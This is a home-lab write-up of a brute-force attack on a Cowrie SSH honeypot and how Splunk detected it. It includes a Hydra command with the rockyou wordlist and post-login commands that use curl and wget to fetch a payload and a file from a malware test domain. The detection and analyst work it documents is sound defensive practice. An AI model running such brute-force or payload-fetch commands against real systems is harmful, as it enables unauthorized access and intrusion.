# Brute Force Attack

## The Attack

From Kali (192.168.1.194), I ran Hydra against the honeypot on port 2222 with the `rockyou.txt` wordlist:

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.150 -s 2222 -t 4
```

Hydra cracked 3 passwords — `123456789`, `12345`, and `password`. These aren't real credentials though. Cowrie is designed to accept common passwords so attackers think they're in a real system.

Once "in," I SSH'd into the honeypot and ran some commands to simulate what a real attacker would do:

- `whoami` — check what user we are
- `curl http://192.168.1.150:8000/payload.sh` — try to pull a payload (failed)
- `wget http://malware.testcategory.com/test` — download a test file from a known malware domain
- `ls` — look around

None of this actually touches the real system. Cowrie is a fake shell — it just logs everything.

![Hydra brute force and post-exploitation](screenshots/brute-force/01-hydra-attack.png)

## What Splunk Picked Up

Over on the Splunk dashboard (192.168.1.111), all of this showed up immediately. The failed login chart spiked during the brute force, and the successful logins chart shows where Cowrie let us in.

The interesting part is the Attack Session Deep Dive table at the bottom — it logs every single command that was run inside the honeypot, with timestamps and session IDs. You can see the `whoami`, the `wget`, the `curl`, all of it.

![Splunk dashboard showing the attack](screenshots/brute-force/02-splunk-dashboard.png)

## Attacker Profile

Splunk also builds an attacker profile that ties everything together for one IP. For 192.168.1.194 it shows:

- 2 failed logins, 5 successful (fake) logins
- 13 commands run
- Username targeted: `root`
- Full list of commands executed
- Threat score: 117

This is the kind of view a SOC analyst would use to quickly understand what an attacker did during a session without digging through raw logs.

![Attacker profile summary](screenshots/brute-force/03-attacker-profile.png)
